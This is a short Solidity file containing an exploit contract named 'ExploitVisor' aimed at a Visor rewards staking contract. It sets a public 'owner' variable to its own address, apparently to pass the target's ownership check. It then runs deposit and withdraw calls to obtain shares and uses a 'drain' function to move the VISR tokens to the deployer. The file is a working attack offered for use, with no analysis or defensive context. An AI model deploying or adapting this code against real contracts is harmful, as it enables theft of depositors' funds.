pragma solidity 0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewardsVisor {
  function deposit(
        uint256 visrDeposit,
        address payable from,
        address to
    ) external returns (uint256 shares);

  function withdraw(
        uint256 shares,
        address to,
        address payable from
    ) external returns (uint256 rewards);
    
}

contract ExploitVisor {
  IRewardsVisor private target;
  IERC20 private VISR;

  address private _owner;
  
  // important variable
  address public owner;

  constructor (address _target, address _VISR, address vVISR) public {
    owner = address(this);
    _owner = msg.sender;
    target = IRewardsVisor(_target);
    VISR = IERC20(_VISR);
    VISR.approve(address(this), type(uint256).max);
    IERC20(vVISR).approve(address(this), type(uint256).max);
  }

  function exploit(/*uint256 n*/) external {
    require(_owner == msg.sender);
    // for(uint256 i; i < n; i = i+1) {
      (uint256 shares) = target.deposit(VISR.balanceOf(address(this)), payable(address(this)), address(this));

      target.withdraw(shares, msg.sender, payable(address(this)));
  }

  function drain()  external {
    require(_owner == msg.sender);
    VISR.transfer(msg.sender, VISR.balanceOf(address(this)));
  }

  fallback() external {

  }

}